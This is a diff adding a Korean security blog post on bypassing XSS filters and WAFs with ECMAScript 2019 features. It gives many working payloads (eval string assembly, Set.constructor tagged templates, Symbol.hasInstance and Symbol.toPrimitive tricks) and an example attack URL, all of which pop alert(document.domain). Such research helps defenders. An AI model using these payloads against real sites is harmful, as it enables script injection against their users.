@@ -1,0 +1,182 @@
+---
+title: "최신 ECMAScript 기능을 활용한 XSS Filtering Bypass"
+description: "ECMAScript 2019(ES10) 최신 기능을 이용한 XSS 필터링 우회 기법 및 원리 해설"
+date: 2019-12-20
+tags: ["web-security", "xss", "bypass", "javascript", "ecmascript"]
+category: "Security Research"
+published: true
+---
+
+# 최신 ECMAScript 기능을 활용한 XSS Filtering Bypass
+
+최근 브라우저의 자바스크립트 엔진이 ECMAScript 2019(ES10) 까지 업데이트 되며 많은 요소와 기능들이 추가되었습니다. 따라서 기존 javascript가 아닌 최신 ECMAScript 표준으로 인한 XSS filtering bypass 기법들이 신설되고 있습니다.
+
+이러한 내용들에 대해 공유하고 그 원리에 대해 간단히 설명드릴까 합니다.
+
+## XSS(Cross-Site Scripting) 취약점이란?
+
+XSS 취약점은 주로 사용자의 unvalid input이 브라우저의 DOM 내부에 삽입되거나, 모종의 javascript 동작으로 인하여 공격자가 원하는 코드를 임의로 실행시키거나, 코드 실행의 흐름을 변경하는 취약점입니다.
+
+## XSS 방어 기제
+
+대다수 경우 XSS 취약점을 방어하기 위해 하기와 같은 방어기제를 둡니다.
+
+### 1. 코드단에서의 필터링
+
+사용자에게 파라미터를 전달받아 이를 DOM에 뿌려야 하는 경우 사용자의 파라미터를 검증(validation)하여 XSS 공격에 사용되는 문구나 문자가 있을 경우 요청을 거절하거나 해당 문구/문자를 삭제합니다.
+
+대표적으로 `"`, `'`, `` ` ``, `<`, `>` 등의 문자, `script`, `alert`, `eval`, `onerror` 등의 HTML Tag 및 Attribute 등이 대상입니다.
+
+예시:
+```java
+<% String param1 = request.getParameter("param1").replaceAll("script", ""); %>
+```
+
+### 2. WAF(Web Application Firewall)에서의 필터링
+
+코드단에서의 필터링과 동일하게 특정 문구나 문자가 있을 경우 사용자의 요청을 거절합니다.
+
+웹방화벽에서의 필터링은 코드단에서보다 해당 서버의 페이지에 전역적으로 적용되기 때문에 일반적으로 문자에 대한 필터링보단 HTML Tag나 Attribute와 같은 문구에 대한 필터링이 강한것이 특징입니다.
+
+## XSS 취약점 발생 상황
+
+```html
+<script>
+    var username = "<%=request.getParameter("username")%>";
+    alert(username+"님 로그인 하셨습니다.");
+</script>
+```
+
+위와 같은 경우 username 파라미터에 `"` 문자를 삽입하여 script 태그 내의 문자열에 삽입되던 파라미터가 문자열을 벗어나고 임의 스크립트를 실행시킬 수 있게 됩니다.
+
+---
+
+## XSS Filtering Bypass 기법
+
+### alert 등 내장함수의 실행을 정규식으로 필터링하는 경우
+
+```javascript
+a=alert; a(document.domain);
+```
+
+javascript에서의 함수(Function)는 Object의 종류 중 하나입니다. 변수 a에 alert 내장함수를 할당하고, 이를 호출함으로써 `alert(document.domain)`을 표현할 수 있습니다.
+
+**변형 예시:**
+
+```javascript
+a=eval; b="aler"; c="t(documen"; d="t.domai"; e="n)"; a(b+c+d+e);
+```
+
+```javascript
+a=eval; a(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="));
+```
+
+### Quote를 사용할 수 없는 경우
+
+```javascript
+eval(8680439..toString(30)+String.fromCharCode(40,49,41))
+```
+
+- `Int..toString(Int)` - 앞의 숫자를 지정된 진법의 문자열로 변환
+- `String.fromCharCode(int, int)` - decimal integer를 문자로 변환 후 연결
+
+```javascript
+eval(/aler/.source+/t(1)/.source)
+```
+
+정규식의 `.source` attribute를 통해 문자열 획득 가능
+
+### 괄호를 사용할 수 없는 경우
+
+```javascript
+Set.constructor`alert\x28document.domain\x29```
+```
+
+- `Set` - Javascript 내장 함수 (다른 내장함수도 가능)
+- `constructor` - 함수의 생성자 설정
+- `` ` `` - Back Quote로 함수에 인자 전달 및 실행
+- `\x28`, `\x29` - Hex Ascii String으로 괄호 표현
+
+**동일 표현:**
+```javascript
+Set.constructor("alert(document.domain)")()
+```
+
+**Hex/Unicode/Octal 변환:**
+```
+\x28 == \u0028 == \50
+```
+
+**변형 예시:**
+
+```javascript
+Set.constructor`alert\`document.domain\````
+```
+
+```javascript
+setTimeout`alert\x28document.domain\x29`
+```
+
+```javascript
+setInterval`alert\x28document.domain\x29`
+```
+
+### 문구 필터링 + Quote 필터링 + 괄호 필터링
+
+```javascript
+_=URL+0,/aler/.source+/t/.source+_[12]+/documen/.source+/t.domai/.source+/n/.source+_[13]instanceof{[Symbol.hasInstance]:eval}
+```
+
+**원리 분석:**
+
+1. `URL+0` - URL 내장함수와 문자열 0을 더하면 Object가 문자열로 변환됨
+2. `_[12]` = `(`, `_[13]` = `)` - 괄호 획득
+3. 정규식 `.source`로 문자열 조합
+4. `Symbol.hasInstance` - 객체가 instance인지 판단하여 동작 재정의
+
+**최종 동작:**
+```javascript
+"alert(document.domain)" instanceof { [Symbol.hasInstance] : eval }
+// → eval("alert(document.domain)")
+```
+
+### 추가 예시
+
+```javascript
+_=URL+0,Array.prototype[Symbol.hasInstance]=eval,/alert/.source+_[12]+1+_[13]instanceof[]
+```
+
+```javascript
+_=URL+!0+!1,Array.prototype[Symbol.hasInstance]=eval,_[19]+_[38]+_[40]+_[33]+_[4]+_[12]+1+_[13]instanceof[]
+```
+
+```javascript
+Event.prototype[Symbol.toPrimitive]=x=>/javascript:0/.source+location.search,onload=open
+```
+
+**위 코드 분석:**
+
+- `location.search` - URI의 `?` 이후 부분
+- `javascript:` scheme으로 페이지 이동 시 임의 자바스크립트 실행 가능
+- `Symbol.toPrimitive` - Symbol 타입을 primitive type으로 변환
+
+**공격 URL 예시:**
+```
+https://ar9ang3.com/test.html?0:alert('xss')//&param1=foo&param2=bar
+```
+
+→ `javascript:0?0:alert('xss')//&param1=foo&param2=bar`
+
+→ 삼항연산자로 `alert('xss')` 실행
+
+---
+
+## 마치며
+
+지금까지 위에 적힌 구문들 외에도 무수히 많은 방법으로 필터링을 우회할 수 있습니다. 혹 새로운 우회기법이 생각나셨다면 공유해주시면 감사하겠습니다.
+
+읽어주셔서 감사합니다.
+
+## Reference
+
+- [xss-cheatsheet_posix](https://blog.rwx.kr/xss-cheatsheet/)
